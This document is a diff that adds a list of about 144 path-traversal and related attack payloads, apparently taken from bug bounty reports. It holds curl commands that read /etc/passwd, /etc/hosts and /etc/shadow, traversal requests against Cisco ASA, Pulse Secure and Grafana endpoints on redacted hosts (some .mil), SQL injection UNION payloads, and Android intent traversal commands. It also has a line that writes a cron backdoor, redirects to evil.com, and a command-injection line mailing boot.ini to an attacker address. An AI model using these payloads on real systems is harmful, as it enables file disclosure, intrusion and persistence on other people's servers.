@@ -1,0 +1,144 @@
+![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd)
+"file:///data/user/0/com.owncloud.android/cache/../shared_prefs/com.owncloud.android_preferences.xml"
+"url":"https:\/\/target.com\/api\/accounts\/..\/..\/F8gHiqSdpK\/statements?month=05&year=2020"
+$ curl --path-as-is --url 'http://127.0.0.1:8080/../../../../etc/passwd'
+$ curl --path-as-is --url 'http://127.0.0.1:8888/../../../../etc/passwd'
+$ curl --path-as-is --url 'http://localhost:8888/../../../../../etc/passwd'
+$ curl -v --path-as-is http://127.0.0.1:3000/../../../../../etc/passwd
+$ curl -v --path-as-is http://127.0.0.1:8080/../../../../../../etc/passwd
+$ curl -v --path-as-is http://127.0.0.1:8080/../../../../../etc/hosts
+$ curl -v --path-as-is http://127.0.0.1:8080/../../../../../etc/passwd
+$ curl -v --path-as-is http://127.0.0.1:8080/../../../../etc/passwd
+$ curl -v --path-as-is http://127.0.0.1:8080/node_modules/../../../../../etc/hosts
+$ ln -s ../../ symdir
+$ ln -s ../../../../../etc/passwd sympasswd
+' and 1=0 union select 1,2,'../../' -- .
+'../../abc/xyz'
+- curl                 -o "../../.gitlab-ci.yml"
+- rm -rf /opt/out/snapshot/log/build.log && ln -s /etc/passwd /opt/out/snapshot/log/build.log
+.../user/../target-repo/pull/1
+../../../../../../../../../../tmp/malicious
+../../../../../../../../../../tmp/poc_file
+../../../../../../../../etc/passwd
+../../../../../../../data/data/jp.naver.line.android/files/something
+../../../../../../../etc/passwd
+../../../../../../../var/tmp/
+../../../../../../../var/tmp/content/../../../../../../home/user/html/wordpress/../../../../../../var/tmp/content
+../../../../../any/where
+../../../lib-1/libjnigraphics
+../../../lib-1/libjnigraphics.so
+../../../usr/share/pixmaps/debian-logo.png
+../gems/rack
+../out_pwn/evil.proto
+../test.csv
+///etc/hosts
+///etc/passwd
+/etc/hosts
+/etc/passwd
+/etc/passwd                                      m-server
+/exploit/etc/passwd
+/metrics../
+/tmp/../etc/passwd
+123' UNION SELECT "' UNION SELECT 1,2,'../api/x'-- ","456","789"--
+<@base64_2>{"account_id":"../../redirect?url=https://target.com/#","hash":0}<@/base64_2>
+<@base64_2>{"account_id":"../../redirect?url=https://target.com/search?q=REST+API#","hash":0}<@/base64_2>
+<@base64_2>{"account_id":"../../redirect?url=https://target.com/uploads/BountyPay.apk#","hash":0}<@/base64_2>
+Content-Disposition: form-data; name="file"; filename="/../../../../../.html"
+GET /help/%5c../%5c../%5c../Gemfile
+GET /help/../../../Gemfile
+WINDMAIL.EXE?%20-n%20c:\boot.ini%20Hacker@hax0r.com%20|%20dir%20c:\\
+a' UNION SELECT "2' UNION SELECT 1,1,'../api' --+-",1,1--+-
+adb shell am start -n com.owncloud.android.debug/com.owncloud.android.ui.activity.ReceiveExternalFilesActivity -t "text/plain" -a "android.intent.action.SEND" --es "android.intent.extra.TEXT" "Arbitrary contents here" --es "android.intent.extra.TITLE" "../shared_prefs/test"
+adb shell am start -n com.owncloud.android.debug/com.owncloud.android.ui.activity.ReceiveExternalFilesActivity -t "text/plain" -a "android.intent.action.SEND" --eu "android.intent.extra.STREAM" "file:///data/user/0/com.owncloud.android.debug/cache/../shared_prefs/com.owncloud.android.debug_preferences.xml"
+am start -W -a android.intent.action.VIEW -d "https://target.com/admin/collections/../../
+content-disposition: attachment; filename="../../../lib-1/libjnigraphics.so"
+curl "http://localhost:3006/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+curl "https://target.com/..\..\..\etc\passwd"
+curl --path-as-is 'http://localhost:8001/../hack'
+curl --path-as-is --url "localhost:10000/../../../../etc/passwd"
+curl --path-as-is -k -D- 'https://███████/dana-na/../dana/html5acc/guacamole/../../../../../../etc/hosts?/dana/html5acc/guacamole/#'
+curl --path-as-is http://localhost:3141/../../../../../../
+curl --path-as-is http://localhost:8080//../../../../etc/passwd
+curl --path-as-is http://localhost:8181/../../file.txt
+curl --path-as-is https://grafana-303ca6f8-█████████.target.com/public/plugins/mysql/../../../../../../../../../../../../usr/share/grafana/conf/defaults.ini
+curl -H “Cookie: token=../+CSCOU+/csco_logo.gif” https://█████/+CSCOE+/session_password.html
+curl -i -k "https://1████/+CSCOU+/../+CSCOE+/files/file_list.json" --path-as-is
+curl -i -k "https://1█████/+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions" --path-as-is
+curl -i -k "https://mvpn3.███/+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions" --path-as-is
+curl -i -k "https://mvpn3.█████████/+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions" --path-as-is
+curl -i -k "https://███.████.█████/+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions" --path-as-is
+curl -i -k "https://███/+CSCOU+/../+CSCOE+/files/file_list.json" --path-as-is
+curl -i -k "https://████/+CSCOU+/../+CSCOE+/files/file_list.json" --path-as-is
+curl -i -k "https://████/+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions" --path-as-is
+curl -i -k "https://█████.████.█████████/+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions" --path-as-is
+curl -i -k "https://█████/+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions" --path-as-is
+curl -i -k "https://██████/+CSCOU+/../+CSCOE+/files/file_list.json" --path-as-is
+curl -i -k "https://███████.███████.mil/+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions" --path-as-is
+curl -i -k "https://███████/+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions" --path-as-is
+curl -i -k "https://████████/+CSCOU+/../+CSCOE+/files/file_list.json" --path-as-is
+curl -i -k "https://████████/+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions" --path-as-is
+curl -i -k "https://█████████.██████/+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions" --path-as-is
+curl -i -k "https://█████████.███████.mil/+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions" --path-as-is
+curl -i -k "https://█████████/+CSCOU+/../+CSCOE+/files/file_list.json" --path-as-is
+curl -i -k --path-as-is https://██████████/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/
+curl -k "https://██████/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../" --output portal_inc.lua
+curl -k "https://███████/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../" --output portal_inc.lua
+curl -k "https://███████/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/session.js&default-language&lang=../" --output session.js
+curl -k "https://████████/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/session.js&default-language&lang=../" --output session.js
+curl -k -H "Cookie: token=../+CSCOU+/csco_logo.gif"
+curl -v --path-as-is http://127.0.0.1:8080/../../../../../../etc/passwd
+curl -vk -m 45 --path-as-is https://████████/+CSCOU+/../+CSCOE+/files/file_list.json
+curl -vk -m 45 --path-as-is https://█████████/+CSCOU+/../+CSCOE+/files/file_list.json?path=%2bCSCOE%2b
+file:///data/data/com.attacker/x/x/x/x/..%2F..%2F..%2F..%2Fsdcard%2Fprefs.xml                                    /data/data/com.attacker/sdcard/prefs.xml
+http://127.0.0.1:8080/etc/passwd
+http://127.0.0.1:8080/node_modules/../../../../../etc/passwd
+http://192.168.144.128/nextcloud/remote.php/dav/files/user/../.bash_profile
+http://localhost:8080//../../../../etc/passwd
+http://target.com/url/demo/../test
+https://192.168.1.100/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/wrong_url.html&default-language&lang=../
+https://target.com/+CSCOU+/../+CSCOE+/files/file_list.json?path=%2bCSCOE%2b
+https://target.com/5195267/reports/progress?filename=/../../../../../../../../../../sdcard/Download/disclosure.txt
+https://target.com/api/accounts/../../redirect?url=https://evil.com/#/statements?month=03&year=2020
+https://target.com/brave/brave-browser/pull/../../../attacker/patch-poc/pull/1
+https://target.com/cloudsql-proxy/../swordlight/load_my_evil_dag.py?a=/cloud_sql_proxy.linux.amd64
+https://target.com/cms/audioitems//etc/shadow
+https://target.com/metrics../.bashrc
+https://target.com/oauth/authorize?client_id=...&scope=read,post&redirect_uri=https://evil.com/../../redirect_url=https://evil2.com/a.php%2Fcomplete
+https://target.com/public/plugins/alertlist/../../../../../../../../../../../../../../../../../../../etc/passwd
+https://target.com/r3c0n_server_4fdk59/album?hash=-4685%27%20UNION%20SELECT%20%22%27%20UNION%20SELECT%201,2,%27../api/user?username=%25%27--+%22,%22456%22,%22789%22--+
+https://target.com/r3c0n_server_4fdk59/album?hash=123%27%20UNION%20SELECT%20%22%27%20UNION%20SELECT%201,2,%27../api/x%27--+%22,%22456%22,%22789%22--+
+https://target.com/r3c0n_server_4fdk59/album?hash=a' UNION SELECT "2' UNION SELECT 1,1,'../api' --+-",1,1--+-
+https://target.com/r3c0n_server_4fdk59/album?hash=asdasd%27%20UNION%20SELECT%20%224%27%20UNION%20SELECT%201,2,\%22../api/hello\%22;/*%22,1,1;/*
+https://target.com/r3c0n_server_4fdk59/album?hash=b%27%20UNION%20ALL%20SELECT%20%221%27%20UNION%20ALL%20SELECT%20%27c%27,%27b%27,%27../api%27--%20-%22,1,2--%20-
+https://target.com/user/../target-repo/pull/1.patch
+https://target.com/users/confirmation?confirmation_token=z2-aaa&invitation_token=/../../test
+https://target.com/users/password/new?invitation_token=/../../test
+https://███.mil/download.php?filePathDownload=data_products/MISC/frida_cal/../../../../../../../../etc/passwd
+https://███/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../
+https://████/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../
+https://█████/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../
+https://█████/download.php?filePathDownload=data_products/../download.php
+https://███████.mil/download.php?filePathDownload=data_products/MISC/frida_cal/../../../../../../../../etc/passwd
+https://███████/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../
+https://████████/download.php?filePathDownload=data_products/../../../../../etc/passwd
+https://█████████/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../
+https://█████████/███/login/downloadForm?filename=../../../../../../../../etc/hosts
+https://█████████/████████=/etc/passwd
+https://██████████/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../
+https://██████████/████/login/downloadForm?filename=../../../../../../../../etc/hosts
+irb(main):029:0> Tempfile.open(["\\..\\..\\..\\..\\..\\Users\\rootx\\malicious",".rb"])
+live_reload ${attacker_server}/..\\..\\traversal_poc.dll
+ln -s /etc/shadow test_shadow
+options.pidfile = "/etc/passwd"   # Replace this with a critical or sensitive file
+redirect_uri=https%3A%2F%2Ftarget.com%2Fusers%2Fauth%2Fpixiv%2Fcallback/../../../../ja/items/4503924
+sftp://host/~a../other/file
+sudo curl                                   -o "../../etc/cron.daily/zzz-backdoor"
+target.com/+CSCOU+/../+CSCOE+/files/file_list.json
+timezone=../../../etc/passwd
+timezone=../../../etc/passwd_error
+{ "user": { "avatar": { "io": ..., "filename": "x.jpg", "key": "../../sensitive" } } }
+{"account_id":"F8gHiqSdpK/../../../redirect?url=https://target.com/
+{"type":"form-update","element":"#algo-id","value":"/../../../../../users/user?firstname=h1&lastname=test&bio=hi#","clientId":"x","roomId":"5ce6e50b298f7c6e0acb68c6"}
+{"type":"form-update","element":"#algo-id","value":"/../../../../../users/user?prefs%5Bsend_login_detected_email%5D=false","clientId":"x","roomId":"5ce6e50b298f7c6e0acb68c6"}
+{"url":"https:\/\/target.com\/api\/accounts\/..\/..\/redirect?url=https:\/\/evil.com\/uploads?\/statements?month=01&year=2020","data":"<html>\n<head><title>Index of \/uploads\/<\/title><\/head>\n<body bgcolor=\"white\">\n<h1>Index of \/uploads\/<\/h1><hr><pre><a href=\"..\/\">..\/<\/a>\n<a href=\"\/uploads\/BountyPay.apk\">BountyPay.apk<\/a>                                        20-Apr-2020 11:26              4043701\n<\/pre><hr><\/body>\n<\/html>\n"}
+█████?x-app=itsm&x-urlpath=../../../../../../../../passwd
